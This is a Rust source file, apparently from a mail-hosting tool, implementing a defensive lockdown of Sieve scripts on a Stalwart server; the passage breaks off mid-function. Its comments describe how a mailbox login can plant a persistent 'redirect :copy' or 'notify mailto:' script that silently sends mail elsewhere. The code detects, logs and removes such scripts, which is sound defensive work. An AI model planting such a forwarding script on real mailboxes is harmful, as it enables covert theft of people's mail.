//! Hosted-mail Sieve lockdown (0.46.6 security fix,
//! `.k2/prds/probes-email-k2-pool-15-v1.md` §0).
//!
//! **The gap.** Stalwart's default user permission set lets a mailbox
//! login (its password, or an app password) write its own active Sieve
//! script over the public JMAP listener (`SieveScript/set`). A
//! `redirect :copy` to an outside address, or an `enotify` `notify
//! "mailto:…"`, silently sends that mailbox's mail elsewhere, and the
//! script survives a password rotation and an app-password revoke.
//!
//! **The fix, in three parts:**
//!
//! 1. **Per-account permissions.** Every mailbox account K2 mints
//!    carries `disabledPermissions` for [`SIEVE_WRITE_PERMISSIONS`]
//!    (the same `Merge` patch as the DAV policy, `dav::merge_permissions`):
//!    at mint ([`mint_permissions`] → `addresses::mint_address`) and, for
//!    accounts that already exist, in the boot reconcile. Stalwart
//!    intersects a credential's permissions with the account's, so a
//!    user can't grant it back to themselves. K2's own forward/OOO
//!    scripts (`sieve_user`) are written by the Admin-role service
//!    account over delegation, which an account's `disabledPermissions`
//!    does not touch (live-verified).
//! 2. **Server-wide:** `x:SieveUserInterpreter.disableCapabilities` gets
//!    `enotify` ([`DISABLED_CAPABILITIES`]) + one `ReloadSettings`. K2
//!    never uses `notify`. `maxRedirects` is NEVER touched: `0` would
//!    silently drop K2's own forwards, which are user-script redirects
//!    too (FW-A26).
//! 3. **Leftover scripts.** The permission blocks new writes but leaves
//!    what a user already wrote running. The reconcile lists every
//!    script on every K2-minted mailbox and keeps exactly K2's two
//!    names, `k2` and `k2-forward` (the allowlist the forwarding PRD's
//!    reconcile shares, FW-A26); everything else is a user script
//!    ([`classify`]). Each user script is first RECORDED (auth-audit log
//!    [`AUDIT_EVENT`], domain-only targets, plus the daemon log), then
//!    deactivated (if active), then destroyed — Stalwart refuses to
//!    destroy an active script, and a deactivate in the same call as the
//!    destroy does not count ([`plan_cleanup`]). If a user script had
//!    displaced K2's `k2` script, K2's script is activated again. A
//!    K2-named script whose content is not what K2 writes (a user could
//!    overwrite it before the lock) is KEPT — the allowlist is by name —
//!    but recorded once ([`AUDIT_EVENT_UNRECOGNISED`]) and named in the
//!    owner notice. One owner notice per pass that found anything.
//!
//! The reconcile runs at every daemon start (so a K2 update applies it
//! and doubles as the audit on update), after a completed `hostmail
//! enable` and after `hostmail upgrade`. Once applied it finds nothing,
//! writes nothing and files no notice.
//!
//! `GET /cli/mail/sieve-audit` (`k2 hostmail audit-sieve`) is the same
//! scan, read-only, across EVERY user account on the server (K2-minted
//! or not): non-K2 scripts with their targets (domain only), K2-named
//! scripts with unrecognised content, which mailboxes still lack the
//! lock, and whether `enotify` is off. Owner/admin only. It also reports
//! the API key lockdown (`mail::api_key_lockdown`, run from this pass):
//! K2 mailboxes that can still mint keys, and every account's key count.

use std::collections::{BTreeMap, HashMap, HashSet};

use serde_json::Value;

use crate::cli_response::CliResponse;
use crate::mail::api_key_lockdown::{self, ApiKeyLockApi};
use crate::mail::dav::{merge_permissions, protected_reason};
use crate::mail::jmap::{SieveScriptInfo, StalwartClient};
use crate::mail::sieve_user;

/// The Sieve write permissions a mailbox login loses: JMAP
/// (`SieveScript/set`) and ManageSieve (PUTSCRIPT, SETACTIVE, DELETESCRIPT,
/// RENAMESCRIPT). Exact Stalwart `Permission` names: one unknown name
/// fails a whole `x:Account/set`, so never add a name without a live
/// check. The JMAP three were probed 2026-10-27; the ManageSieve four
/// 2026-10-28 on 0.16.10 and 0.16.25 (`tests/mail/stalwart-forward-gap-probe.py`
/// G6: with only the JMAP lock, a mailbox password still PUTSCRIPTs and
/// activates a redirect over ManageSieve wherever a :4190 listener exists;
/// with these four, PUTSCRIPT answers `NO`). K2's enable flow destroys the
/// `sieve` listener, so this closes the door on boxes where one was
/// re-added. Read (`SieveScript/get`, `/validate`, GETSCRIPT, LISTSCRIPTS)
/// stays. An account locked with the JMAP three only is re-patched by the
/// boot reconcile ([`is_locked`] wants every name).
pub const SIEVE_WRITE_PERMISSIONS: &[&str] = &[
    "jmapSieveScriptCreate",
    "jmapSieveScriptUpdate",
    "jmapSieveScriptDestroy",
    "sievePutScript",
    "sieveSetActive",
    "sieveDeleteScript",
    "sieveRenameScript",
];

/// User-interpreter Sieve capabilities K2 turns off server-wide.
pub const DISABLED_CAPABILITIES: &[&str] = &["enotify"];

/// Auth-audit event for a user script K2 is about to remove.
pub const AUDIT_EVENT: &str = "mail-sieve-removed";
/// Auth-audit event for a kept K2-named script with content K2 did not write.
pub const AUDIT_EVENT_UNRECOGNISED: &str = "mail-sieve-unrecognised";

const P: &str = "[mail/sieve-lockdown]";

// ── Permissions ─────────────────────────────────────────────────────────

/// The `permissions` value that adds the Sieve lock to `existing`,
/// keeping every other entry. `Ok(None)` = already locked.
pub fn lock_permissions(existing: Option<&Value>) -> Result<Option<Value>, String> {
    merge_permissions(existing, SIEVE_WRITE_PERMISSIONS, &[])
}

/// Does `perms` already deny every Sieve write permission?
pub fn is_locked(perms: Option<&Value>) -> bool {
    matches!(lock_permissions(perms), Ok(None))
}

/// The `permissions` a NEW mailbox is created with: `base` (the DAV
/// policy's create permissions, `None` = Stalwart's default) plus the
/// Sieve lock. Never `None` — every mint is locked from its first login.
pub fn mint_permissions(base: Option<Value>) -> Result<Value, String> {
    match lock_permissions(base.as_ref())? {
        Some(v) => Ok(v),
        None => base.ok_or_else(|| "sieve lock: no permissions to create with".to_string()),
    }
}

// ── Sieve lexer (enough of RFC 5228 §2 to find outbound actions) ───────

#[derive(Debug, Clone, PartialEq)]
enum Tok {
    Word(String),
    Tag,
    Str(String),
    Num,
    Punct(char),
}

fn tokenize(src: &str) -> Vec<Tok> {
    let c: Vec<char> = src.chars().collect();
    let mut i = 0;
    let mut out = Vec::new();
    while i < c.len() {
        let ch = c[i];
        if ch.is_whitespace() {
            i += 1;
        } else if ch == '#' {
            while i < c.len() && c[i] != '\n' {
                i += 1;
            }
        } else if ch == '/' && c.get(i + 1) == Some(&'*') {
            i += 2;
            while i < c.len() && !(c[i] == '*' && c.get(i + 1) == Some(&'/')) {
                i += 1;
            }
            i += 2;
        } else if ch == '"' {
            i += 1;
            let mut s = String::new();
            while i < c.len() && c[i] != '"' {
                if c[i] == '\\' && i + 1 < c.len() {
                    i += 1;
                }
                s.push(c[i]);
                i += 1;
            }
            i += 1;
            out.push(Tok::Str(s));
        } else if ch == ':' && c.get(i + 1).is_some_and(|n| n.is_ascii_alphabetic() || *n == '_') {
            i += 1;
            while i < c.len() && (c[i].is_ascii_alphanumeric() || c[i] == '_') {
                i += 1;
            }
            out.push(Tok::Tag);
        } else if ch.is_ascii_alphabetic() || ch == '_' {
            let start = i;
            while i < c.len() && (c[i].is_ascii_alphanumeric() || c[i] == '_') {
                i += 1;
            }
            let word: String = c[start..i].iter().collect();
            if word.eq_ignore_ascii_case("text") && c.get(i) == Some(&':') {
                // Multi-line literal: the rest of this line is ignored,
                // then lines up to a lone "." (dot-stuffing undone).
                i += 1;
                while i < c.len() && c[i] != '\n' {
                    i += 1;
                }
                i += 1;
                let mut body = String::new();
                while i < c.len() {
                    let ls = i;
                    while i < c.len() && c[i] != '\n' {
                        i += 1;
                    }
                    let line: String = c[ls..i].iter().collect();
                    i += 1;
                    let line = line.trim_end_matches('\r');
                    if line == "." {
                        break;
                    }
                    let line = match line.strip_prefix('.') {
                        Some(rest) if rest.starts_with('.') => rest,
                        _ => line,
                    };
                    body.push_str(line);
                    body.push('\n');
                }
                out.push(Tok::Str(body));
            } else {
                out.push(Tok::Word(word));
            }
        } else if ch.is_ascii_digit() {
            while i < c.len() && c[i].is_ascii_alphanumeric() {
                i += 1;
            }
            out.push(Tok::Num);
        } else {
            out.push(Tok::Punct(ch));
            i += 1;
        }
    }
    out
}

/// Every outbound action in `src`: (`redirect`|`notify`, its target
/// argument(s) verbatim). Both commands take their target as the LAST
/// positional argument, after any tagged ones (RFC 5228 §4.2, RFC 5435
/// §3), so the last string or string list before `;` is the target.
fn outbound_actions(src: &str) -> Vec<(&'static str, Vec<String>)> {
    let toks = tokenize(src);
    let mut out = Vec::new();
    let mut at_command = true;
    let mut i = 0;
    while i < toks.len() {
        match &toks[i] {
            Tok::Punct(';') | Tok::Punct('{') | Tok::Punct('}') => {
                at_command = true;
                i += 1;
            }
            Tok::Word(w) if at_command => {
                at_command = false;
                let action = if w.eq_ignore_ascii_case("redirect") {
                    Some("redirect")
                } else if w.eq_ignore_ascii_case("notify") {
                    Some("notify")
                } else {
                    None
                };
                i += 1;
                let Some(action) = action else { continue };
                let mut last: Vec<String> = Vec::new();
                while i < toks.len() {
                    match &toks[i] {
                        Tok::Punct(';') | Tok::Punct('{') | Tok::Punct('}') => break,
                        Tok::Str(s) => last = vec![s.clone()],
                        Tok::Punct('[') => {
                            let mut list = Vec::new();
                            i += 1;
                            while i < toks.len() && toks[i] != Tok::Punct(']') {
                                if let Tok::Str(s) = &toks[i] {
                                    list.push(s.clone());
                                }
                                i += 1;
                            }
                            last = list;
                        }
                        _ => {}
                    }
                    i += 1;
                }
                out.push((action, last));
            }
            _ => {
                if matches!(toks[i], Tok::Word(_)) {
                    at_command = false;
                }
                i += 1;
            }
        }
    }
    out
}

fn percent_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() {
            let hex = std::str::from_utf8(&b[i + 1..i + 3]).ok();
            if let Some(v) = hex.and_then(|h| u8::from_str_radix(h, 16).ok()) {
                out.push(v);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Domain only (the redaction rule): never the local part.
fn domain_of(addr: &str) -> String {
    let a = addr.trim().trim_start_matches('<').trim_end_matches('>').trim();
    match a.rsplit_once('@') {
        Some((_, d)) => {
            let d = d.trim().trim_end_matches('.').to_ascii_lowercase();
            if d.is_empty() {
                "(unparsed)".to_string()
            } else {
                d
            }
        }
        None => "(unparsed)".to_string(),
    }
}

/// The redacted target domains of one action argument.
fn target_domains(action: &str, raw: &str) -> Vec<String> {
    if raw.contains("${") {
        return vec!["(variable)".to_string()];
    }
    if action == "redirect" {
        return vec![domain_of(raw)];
    }
    match raw.trim().split_once(':') {
        Some((scheme, rest)) if scheme.eq_ignore_ascii_case("mailto") => {
            let (to, query) = match rest.split_once('?') {
                Some((t, q)) => (t, Some(q)),
                None => (rest, None),
            };
            let mut out: Vec<String> = to
                .split(',')
                .filter(|p| !p.trim().is_empty())
                .map(|p| domain_of(&percent_decode(p)))
                .collect();
            // `?to=` / `cc` / `bcc` header fields add recipients (RFC 6068).
            for kv in query.unwrap_or("").split('&') {
                if let Some((k, v)) = kv.split_once('=') {
                    if ["to", "cc", "bcc"].contains(&k.to_ascii_lowercase().as_str()) {
                        out.extend(
                            percent_decode(v)
                                .split(',')
                                .filter(|p| !p.trim().is_empty())
                                .map(domain_of),
                        );
                    }
                }
            }
            if out.is_empty() {
                out.push("(unparsed)".to_string());
            }
            out
        }
        Some((scheme, _)) => vec![format!("({} notify)", scheme.to_ascii_lowercase())],
        None => vec!["(unparsed)".to_string()],
    }
}

// ── Classification ──────────────────────────────────────────────────────

/// Who a script belongs to. The allowlist is by NAME: exactly `k2` and
/// `k2-forward` are K2's (FW-A26); everything else is a user script.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Owner {
    /// `k2` / `k2-forward`, byte-for-byte as K2 writes it. Kept.
    K2,
    /// `k2` / `k2-forward` with content K2 did not write (a user could
    /// overwrite it before the lock). Kept, but recorded and flagged.
    K2Unrecognised,
    /// Anything else. Removed.
    User,
}

impl Owner {
    pub fn as_str(self) -> &'static str {
        match self {
            Owner::K2 => "k2",
            Owner::K2Unrecognised => "k2-unrecognised-content",
            Owner::User => "user",
        }
    }

    pub fn removed(self) -> bool {
        self == Owner::User
    }
}

/// Exactly K2's two script names.
pub fn is_k2_name(name: &str) -> bool {
    name == sieve_user::SCRIPT_NAME || name == sieve_user::LEGACY_FORWARD_NAME
}

/// One redirect/notify target, redacted to its domain.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Target {
    pub action: &'static str,
    pub domain: String,
    /// Not one of this box's hosted domains.
    pub external: bool,
}

impl Target {
    fn to_json(&self) -> Value {
        serde_json::json!({ "action": self.action, "domain": self.domain, "external": self.external })
    }
}

/// One script on one mailbox, classified.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptView {
    pub id: String,
    pub name: String,
    pub blob_id: String,
    pub active: bool,
    pub owner: Owner,
    pub targets: Vec<Target>,
}

impl ScriptView {
    fn to_json(&self) -> Value {
        serde_json::json!({
            "id": self.id,
            "name": self.name,
            "active": self.active,
            "owner": self.owner.as_str(),
            "targets": self.targets.iter().map(Target::to_json).collect::<Vec<_>>(),
        })
    }
}

/// The pre-composer `k2-forward` rendering (catchall/alias-forward cut).
fn legacy_forward(dest: &str, keep: bool) -> String {
    let quoted = format!("\"{}\"", dest.replace('\\', "\\\\").replace('"', "\\\""));
    if keep {
        format!("require [\"copy\"];\nredirect :copy {quoted};\n")
    } else {
        format!("redirect {quoted};\n")
    }
}

/// Is `src` byte-for-byte what K2 writes for a `name` script?
fn is_k2_rendering(name: &str, src: &str) -> bool {
    if src == "keep;\n" {
        return true; // save_user_sieve's empty remainder
    }
    let parsed = sieve_user::parse(src);
    if sieve_user::compose(&parsed).as_deref() == Some(src) {
        return true;
    }
    name == sieve_user::LEGACY_FORWARD_NAME
        && parsed.ooo.is_none()
        && parsed
            .forward
            .as_ref()
            .is_some_and(|f| legacy_forward(&f.dest, f.keep) == src)
}

/// Classify one script and list its outbound targets (domain only).
/// `is_hosted(domain)` = the domain is hosted on this box.
pub fn classify(name: &str, src: &str, is_hosted: &dyn Fn(&str) -> bool) -> (Owner, Vec<Target>) {
    let mut targets = Vec::new();
    for (action, args) in outbound_actions(src) {
        if args.is_empty() {
            targets.push(Target { action, domain: "(unparsed)".to_string(), external: true });
        }
        for raw in &args {
            for domain in target_domains(action, raw) {
                let external = !is_hosted(&domain);
                targets.push(Target { action, domain, external });
            }
        }
    }
    let owner = if !is_k2_name(name) {
        Owner::User
    } else if is_k2_rendering(name, src) && targets.iter().all(|t| t.action == "redirect") {
        Owner::K2
    } else {
        Owner::K2Unrecognised
    };
    (owner, targets)
}

// ── Cleanup plan ────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Step {
    /// `onSuccessDeactivateScript: true`, alone.
    Deactivate,
    /// `destroy` the listed ids (none of them active by now).
    Destroy(Vec<String>),
    /// Put K2's own script back as the active one.
    Activate(String),
}

/// The ordered calls that remove every user script on one mailbox.
/// Empty = nothing to do. Never touches `k2` / `k2-forward`.
pub fn plan_cleanup(scripts: &[ScriptView]) -> Vec<Step> {
    let remove: Vec<&ScriptView> = scripts.iter().filter(|s| s.owner.removed()).collect();
    if remove.is_empty() {
        return Vec::new();
    }
    let mut steps = Vec::new();
    let deactivate = remove.iter().any(|s| s.active);
    if deactivate {
        steps.push(Step::Deactivate);
    }
    steps.push(Step::Destroy(remove.iter().map(|s| s.id.clone()).collect()));
    if deactivate {
        // Only content K2 wrote goes back to active; an unrecognised
        // K2-named script stays as it is and is flagged instead.
        let keeper = scripts
            .iter()
            .filter(|s| s.owner == Owner::K2)
            .min_by_key(|s| if s.name == sieve_user::SCRIPT_NAME { 0 } else { 1 });
        if let Some(k) = keeper {
            steps.push(Step::Activate(k.id.clone()));
        }
    }
    steps
}

// ── Engine seam ─────────────────────────────────────────────────────────

/// What the lockdown needs from Stalwart. Production = the JMAP client
/// (Admin-role service account, delegated); tests use a recording fake.
pub trait SieveLockApi {
    /// Every registry account id.
    fn all_account_ids(&self) -> Result<Vec<String>, String>;
    /// `x:Account/get` rows (`id`, `@type`, `name`, `roles`, `permissions`).
    fn account_rows(&self, ids: &[String]) -> Result<Vec<Value>, String>;
    fn set_permissions(&self, id: &str, permissions: &Value) -> Result<(), String>;
    fn list_scripts(&self, account_id: &str) -> Result<Vec<SieveScriptInfo>, String>;
    fn script_source(&self, account_id: &str, blob_id: &str) -> Result<Vec<u8>, String>;
    fn deactivate(&self, account_id: &str) -> Result<(), String>;
    fn destroy(&self, account_id: &str, ids: &[String]) -> Result<(), String>;
    fn activate(&self, account_id: &str, id: &str) -> Result<(), String>;
    fn interpreter_disabled(&self) -> Result<Value, String>;
    fn set_interpreter_disabled(&self, disabled: &Value) -> Result<(), String>;
    fn reload_settings(&self) -> Result<(), String>;
}

impl SieveLockApi for StalwartClient {
    fn all_account_ids(&self) -> Result<Vec<String>, String> {
        self.account_query_ids()
    }
    fn account_rows(&self, ids: &[String]) -> Result<Vec<Value>, String> {
        self.account_get_permissions(ids)
    }
    fn set_permissions(&self, id: &str, permissions: &Value) -> Result<(), String> {
        self.account_set_permissions(id, permissions)
    }
    fn list_scripts(&self, account_id: &str) -> Result<Vec<SieveScriptInfo>, String> {
        self.sieve_scripts_list(account_id)
    }
    fn script_source(&self, account_id: &str, blob_id: &str) -> Result<Vec<u8>, String> {
        self.sieve_script_blob(account_id, blob_id)
    }
    fn deactivate(&self, account_id: &str) -> Result<(), String> {
        self.sieve_deactivate(account_id)
    }
    fn destroy(&self, account_id: &str, ids: &[String]) -> Result<(), String> {
        self.sieve_scripts_destroy(account_id, ids)
    }
    fn activate(&self, account_id: &str, id: &str) -> Result<(), String> {
        self.sieve_activate(account_id, id)
    }
    fn interpreter_disabled(&self) -> Result<Value, String> {
        self.sieve_user_interpreter_disabled()
    }
    fn set_interpreter_disabled(&self, disabled: &Value) -> Result<(), String> {
        self.sieve_user_interpreter_set_disabled(disabled)
    }
    fn reload_settings(&self) -> Result<(), String> {
        self.action_reload_settings()
    }
}

/// Classify every script on one account.
pub fn scan_account(
    api: &dyn SieveLockApi,
    account_id: &str,
    is_hosted: &dyn Fn(&str) -> bool,
) -> Result<Vec<ScriptView>, String> {
    let mut out = Vec::new();
    for sc in api.list_scripts(account_id)? {
        let src = if sc.blob_id.trim().is_empty() {
            String::new()
        } else {
            String::from_utf8_lossy(&api.script_source(account_id, &sc.blob_id)?).into_owned()
        };
        let (owner, targets) = classify(&sc.name, &src, is_hosted);
        out.push(ScriptView {
            id: sc.id,
            name: sc.name,
            blob_id: sc.blob_id,
            active: sc.is_active,
            owner,
            targets,
        });
    }
    Ok(out)
}

// ── enotify ─────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CapsOutcome {
    AlreadyOff,
    TurnedOff,
    /// Saved, but Stalwart refused the reload: applies at its next start.
    SavedNotLoaded(String),
    Failed(String),
}

/// `{name: true}` map from Stalwart's wire form (map or list).
fn caps_map(v: &Value) -> Result<BTreeMap<String, bool>, String> {
    let mut out = BTreeMap::new();
    match v {
        Value::Null => {}
        Value::Object(m) => {
            for (k, val) in m {
                if val.as_bool() == Some(true) {
                    out.insert(k.clone(), true);
                }
            }
        }
        Value::Array(a) => {
            for item in a {
                let s = item
                    .as_str()
                    .ok_or_else(|| format!("disableCapabilities entry is not a string: {item}"))?;
                out.insert(s.to_string(), true);
            }
        }
        other => return Err(format!("disableCapabilities is not a map: {other}")),
    }
    Ok(out)
}

/// The full `disableCapabilities` to write, or `None` when every name in
/// [`DISABLED_CAPABILITIES`] is already off. Keeps what an operator set.
/// Only `disableCapabilities` — never `maxRedirects` (FW-A26).
pub fn plan_caps(current: &Value) -> Result<Option<Value>, String> {
    let mut m = caps_map(current)?;
    if DISABLED_CAPABILITIES.iter().all(|c| m.contains_key(*c)) {
        return Ok(None);
    }
    for c in DISABLED_CAPABILITIES {
        m.insert((*c).to_string(), true);
    }
    Ok(Some(Value::Object(m.into_iter().map(|(k, v)| (k, Value::Bool(v))).collect())))
}

pub fn enotify_off_state(api: &dyn SieveLockApi) -> Result<bool, String> {
    Ok(plan_caps(&api.interpreter_disabled()?)?.is_none())
}

pub fn ensure_caps_off(api: &dyn SieveLockApi) -> CapsOutcome {
    let current = match api.interpreter_disabled() {
        Ok(v) => v,
        Err(e) => return CapsOutcome::Failed(e),
    };
    let next = match plan_caps(&current) {
        Ok(None) => return CapsOutcome::AlreadyOff,
        Ok(Some(n)) => n,
        Err(e) => return CapsOutcome::Failed(e),
    };
    if let Err(e) = api.set_interpreter_disabled(&next) {
        return CapsOutcome::Failed(e);
    }
    match api.reload_settings() {
        Ok(()) => CapsOutcome::TurnedOff,
        Err(e) => CapsOutcome::SavedNotLoaded(e),
    }
}

// ── Reconcile ───────────────────────────────────────────────────────────

/// One script the reconcile recorded: a user script it removed (or
/// tried to), or a kept K2-named script with unrecognised content.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    pub account_id: String,
    pub address: Option<String>,
    pub script: ScriptView,
    /// Removals only: set once the account's cleanup calls all succeeded.
    pub removed: bool,
}

impl Finding {
    pub fn is_removal(&self) -> bool {
        self.script.owner.removed()
    }

    pub fn audit_event(&self) -> &'static str {
        if self.is_removal() {
            AUDIT_EVENT
        } else {
            AUDIT_EVENT_UNRECOGNISED
        }
    }

    /// Dedup key for a kept, flagged script (same content = same key).
    pub fn flag_key(&self) -> String {
        format!("{}:{}:{}", self.account_id, self.script.id, self.script.blob_id)
    }

    /// The auth-audit `detail` (domains only; never a local part).
    pub fn audit_detail(&self, at: &str) -> Value {
        serde_json::json!({
            "accountId": self.account_id,
            "address": self.address,
            "script": self.script.name,
            "active": self.script.active,
            "owner": self.script.owner.as_str(),
            "action": if self.is_removal() { "remove" } else { "keep" },
            "targets": self.script.targets.iter().map(Target::to_json).collect::<Vec<_>>(),
            "at": at,
        })
    }
}

#[derive(Debug, Default)]
pub struct ReconcileReport {
    pub accounts: usize,
    pub locked: Vec<String>,
    pub already_locked: usize,
    pub lock_failed: Vec<(String, String)>,
    pub skipped: Vec<(String, String)>,
    pub findings: Vec<Finding>,
    pub account_failed: Vec<(String, String)>,
    pub caps: Option<CapsOutcome>,
}

impl ReconcileReport {
    pub fn removals(&self) -> impl Iterator<Item = &Finding> {
        self.findings.iter().filter(|f| f.is_removal())
    }

    pub fn lines(&self) -> Vec<String> {
        let caps = match &self.caps {
            None => "not checked".to_string(),
            Some(CapsOutcome::AlreadyOff) => "already off".to_string(),
            Some(CapsOutcome::TurnedOff) => "turned off".to_string(),
            Some(CapsOutcome::SavedNotLoaded(e)) => {
                format!("saved, reload refused (applies at Stalwart's next start): {e}")
            }
            Some(CapsOutcome::Failed(e)) => format!("FAILED (retried at the next start): {e}"),
        };
        let removed = self.removals().filter(|r| r.removed).count();
        let flagged = self.findings.len() - self.removals().count();
        let mut out = vec![format!(
            "{P} {} mailbox(es): {} locked now, {} already locked, {} lock failed, {} skipped; \
             {removed} user script(s) removed, {flagged} new unrecognised K2-named script(s) kept, \
             {} account(s) failed; enotify: {caps}",
            self.accounts,
            self.locked.len(),
            self.already_locked,
            self.lock_failed.len(),
            self.skipped.len(),
            self.account_failed.len()
        )];
        for (id, e) in &self.lock_failed {
            out.push(format!("{P} account {id} lock FAILED (retried at the next start): {e}"));
        }
        for (id, e) in &self.account_failed {
            out.push(format!("{P} account {id} script cleanup FAILED (retried at the next start): {e}"));
        }
        out
    }
}

/// Lock every K2-minted mailbox in `accounts` (`(account id, address)`),
/// remove every user script on it, and turn `enotify` off. `record` is
/// called for each user script BEFORE any call that removes it, and for
/// each unrecognised K2-named script whose [`Finding::flag_key`] is not
/// in `flagged_before`. Never stops at the first failure.
pub fn reconcile(
    api: &dyn SieveLockApi,
    accounts: &[(String, Option<String>)],
    is_hosted: &dyn Fn(&str) -> bool,
    flagged_before: &HashSet<String>,
    record: &mut dyn FnMut(&Finding),
) -> ReconcileReport {
    let mut report = ReconcileReport {
        accounts: accounts.len(),
        caps: Some(ensure_caps_off(api)),
        ..ReconcileReport::default()
    };
    if accounts.is_empty() {
        return report;
    }
    let ids: Vec<String> = accounts.iter().map(|(id, _)| id.clone()).collect();
    let rows = match api.account_rows(&ids) {
        Ok(r) => r,
        Err(e) => {
            report.account_failed = ids.into_iter().map(|id| (id, e.clone())).collect();
            return report;
        }
    };
    let by_id: HashMap<&str, &Value> = rows
        .iter()
        .filter_map(|r| r.get("id").and_then(|v| v.as_str()).map(|id| (id, r)))
        .collect();
    for (id, address) in accounts {
        let Some(row) = by_id.get(id.as_str()) else {
            report.skipped.push((id.clone(), "not on the mail server".to_string()));
            continue;
        };
        if let Some(why) = protected_reason(row) {
            report.skipped.push((id.clone(), why));
            continue;
        }
        // Lock first, so nothing new can be written while we clean up.
        match lock_permissions(row.get("permissions")) {
            Ok(None) => report.already_locked += 1,
            Ok(Some(next)) => match api.set_permissions(id, &next) {
                Ok(()) => report.locked.push(id.clone()),
                Err(e) => report.lock_failed.push((id.clone(), e)),
            },
            Err(e) => report.lock_failed.push((id.clone(), e)),
        }
        let scripts = match scan_account(api, id, is_hosted) {
            Ok(s) => s,
            Err(e) => {
                report.account_failed.push((id.clone(), e));
                continue;
            }
        };
        for s in scripts.iter().filter(|s| s.owner == Owner::K2Unrecognised) {
            let f = Finding { account_id: id.clone(), address: address.clone(), script: s.clone(), removed: false };
            if !flagged_before.contains(&f.flag_key()) {
                record(&f);
                report.findings.push(f);
            }
        }
        let steps = plan_cleanup(&scripts);
        if steps.is_empty() {
            continue;
        }
        let first = report.findings.len();
        for s in scripts.iter().filter(|s| s.owner.removed()) {
            let f = Finding { account_id: id.clone(), address: address.clone(), script: s.clone(), removed: false };
            record(&f);
            report.findings.push(f);
        }
        let mut failed = None;
        for step in &steps {
            let res = match step {
                Step::Deactivate => api.deactivate(id),
                Step::Destroy(ids) => api.destroy(id, ids),
                Step::Activate(k) => api.activate(id, k),
            };
            if let Err(e) = res {
                failed = Some(format!("{step:?}: {e}"));
                break;
            }
        }
        match failed {
            None => {
                for f in &mut report.findings[first..] {
                    f.removed = true;
                }
            }
            Some(e) => report.account_failed.push((id.clone(), e)),
        }
    }
    report
}

/// The owner notice for a pass that found something. `None` = nothing.
pub fn notice_text(report: &ReconcileReport) -> Option<(String, String)> {
    if report.findings.is_empty() {
        return None;
    }
    let mut by_account: BTreeMap<String, Vec<&Finding>> = BTreeMap::new();
    for f in &report.findings {
        let key = f.address.clone().unwrap_or_else(|| format!("account {}", f.account_id));
        by_account.entry(key).or_default().push(f);
    }
    let removed = report.removals().filter(|r| r.removed).count();
    let flagged = report.findings.len() - report.removals().count();
    let title = if flagged == 0 {
        format!(
            "Hosted mail: removed {removed} mailbox filter script(s) on {} mailbox(es)",
            by_account.len()
        )
    } else {
        format!(
            "Hosted mail: removed {removed} mailbox filter script(s), {flagged} to check, on {} mailbox(es)",
            by_account.len()
        )
    };
    let mut body = String::from(
        "Mailbox users can no longer create their own server-side filter (Sieve) scripts. \
         K2 found scripts that users had written themselves and removed them. K2-managed \
         forwarding and out-of-office are unaffected.\n\n\
         A script that forwards or notifies to an outside domain may have sent copies of that \
         mailbox's mail there. Check with the people below if that was expected.\n\n",
    );
    for (who, list) in &by_account {
        body.push_str(&format!("- {who}\n"));
        for f in list {
            let targets: Vec<String> = f
                .script
                .targets
                .iter()
                .map(|t| format!("{} → {}{}", t.action, t.domain, if t.external { " (outside)" } else { "" }))
                .collect();
            let what = if f.is_removal() {
                if f.removed { "removed" } else { "NOT removed yet (K2 retries at its next start)" }
            } else {
                "kept (K2's script name, but not content K2 wrote — check it: `k2 hostmail forward show` / `ooo show`, then set or unset it again)"
            };
            body.push_str(&format!(
                "  - script \"{}\"{}: {}; {what}\n",
                f.script.name,
                if f.script.active { " (active)" } else { "" },
                if targets.is_empty() { "no forward or notify".to_string() } else { targets.join(", ") },
            ));
        }
    }
    body.push_str(&format!(
        "\nEach one is recorded in the auth audit log (~/.k2/auth-audit.jsonl, events \
         {AUDIT_EVENT} / {AUDIT_EVENT_UNRECOGNISED}). `k2 hostmail audit-sieve` lists what is left."
    ));
    Some((title, body))
}

// ── Read-only audit ─────────────────────────────────────────────────────

/// The read-only audit across every account on the server. `k2_minted`
/// maps K2's account ids to their addresses. 0.46.6: also, per account,
/// whether it can still mint API keys (`sysApiKeyCreate`, K2 mailboxes)
/// and how many API keys it holds (`keys`, `x:ApiKey/query`).
pub fn audit(
    api: &dyn SieveLockApi,
    keys: &dyn ApiKeyLockApi,
    k2_minted: &HashMap<String, String>,
    is_hosted: &dyn Fn(&str) -> bool,
) -> Result<Value, String> {
    let mut ids = api.all_account_ids()?;
    for id in k2_minted.keys() {
        if !ids.contains(id) {
            ids.push(id.clone());
        }
    }
    ids.sort();
    let rows = if ids.is_empty() { Vec::new() } else { api.account_rows(&ids)? };
    let mut accounts = Vec::new();
    let (mut scanned, mut k2_count, mut locked, mut unlocked) = (0usize, 0usize, 0usize, 0usize);
    let (mut user_scripts, mut unrecognised, mut outside, mut errors, mut skipped) =
        (0usize, 0usize, 0usize, 0usize, 0usize);
    let (mut key_locked, mut key_unlocked, mut key_holders, mut key_total) = (0usize, 0usize, 0usize, 0usize);
    for row in &rows {
        let Some(id) = row.get("id").and_then(|v| v.as_str()) else { continue };
        if protected_reason(row).is_some() {
            skipped += 1;
            continue;
        }
        scanned += 1;
        let address = k2_minted.get(id).cloned();
        let is_k2 = address.is_some();
        let sieve_locked = is_locked(row.get("permissions"));
        let api_key_locked = api_key_lockdown::is_locked(row.get("permissions"));
        if is_k2 {
            k2_count += 1;
            if sieve_locked {
                locked += 1;
            } else {
                unlocked += 1;
            }
            if api_key_locked {
                key_locked += 1;
            } else {
                key_unlocked += 1;
            }
        }
        let name = row.get("name").and_then(|v| v.as_str()).unwrap_or("");
        let mut entry = serde_json::json!({
            "accountId": id,
            "name": name,
            "address": address,
            "k2Minted": is_k2,
            "sieveLocked": sieve_locked,
            "apiKeyLocked": api_key_locked,
        });
        // A K2 mailbox that can still mint keys, or any account holding
